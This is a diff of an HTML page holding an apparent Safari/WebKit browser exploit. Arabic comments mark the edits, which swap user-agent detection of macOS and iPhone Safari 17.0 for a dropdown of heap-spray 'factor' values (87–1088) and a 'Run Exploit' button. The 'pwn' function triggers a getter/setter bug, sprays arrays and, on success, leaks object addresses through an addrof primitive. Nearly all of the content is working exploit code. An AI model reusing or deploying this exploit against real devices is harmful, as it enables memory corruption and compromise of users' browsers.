@@ -4,13 +4,22 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="util.js"></script>
-<script src="int64.js"></script>
+    <script src="int64.js"></script>
     <title>Document</title>
 </head>
 <body>
-    <p id="factors">
-    </p>
+    <p id="factors"></p>
     <p id="status"></p>
+    <select id="factorSelect">
+        <option value="0" disabled selected>Select Factor</option>
+        <!-- خيارات من 87 إلى 1088 -->
+        <script>
+            for (let i = 87; i <= 1088; i++) {
+                document.write(`<option value="${i}">${i}</option>`);
+            }
+        </script>
+    </select>
+    <button id="runBtn">Run Exploit</button>
     <script>
 
 /*
@@ -87,7 +96,7 @@ function trigger(type) {
     return [getter, get_getterSetter(1)];
 }
 
-(function pwn() {
+function pwn() {
     let [getter, getterSetter] = trigger();
     let success = false;
     try {
@@ -104,20 +113,10 @@ function trigger(type) {
 
     let symbolObject = Object(getterSetter);
 
-    let isMac = navigator.userAgent.indexOf('Macintosh;') !== -1;
-    let isIphone = navigator.userAgent.indexOf('iPhone;') !== -1;
-    let version = navigator.userAgent.split('Version/')[1].split(' ')[0];
-    let factor;
-    let unknown_device = false;
+    // الحصول على factor من القائمة المنسدلة
+    let factor = parseInt(document.getElementById("factorSelect").value);
 
-    if (isMac && version == '17.0') {
-        factor = 840;
-    } else if (isIphone && version == '17.0') {
-        factor = 87;
-    } else {
-        factor = 87 + Math.floor(Math.random() * 1000);
-        unknown_device = true;
-    }
+    document.getElementById("factors").innerHTML = "Tried factor: " + factor;
 
     let ref_arr = [];
     for (let i = 0; i < factor; ++i) {
@@ -144,18 +143,18 @@ function trigger(type) {
         return;
     } else {
         alert(`success!!!`);
-        if (unknown_device) {
-            alert(`It seems you have found a valid factor for an untested device!\nIf you send this information to me, it could be helpful to others.\nisMac: ${isMac}, isiPhone: ${isIphone}, version: ${version}, factor: ${factor}, userAgent: ${navigator.userAgent}`);
-            document.getElementById("status").innerHTML = "Success!"
-        }
+        alert(`It seems you have found a valid factor for an untested device!\nIf you send this information to me, it could be helpful to others.\nfactor: ${factor}, userAgent: ${navigator.userAgent}`);
+        document.getElementById("status").innerHTML = "Success!"
     }
 
     alert(addrof({}).toString());
     alert(addrof({}).toString());
     alert(addrof({}).toString());
     alert(addrof({}).toString());
-})();
+}
 
+// إضافة حدث النقر على الزر
+document.getElementById("runBtn").addEventListener("click", pwn);
     </script>
 </body>
 </html>
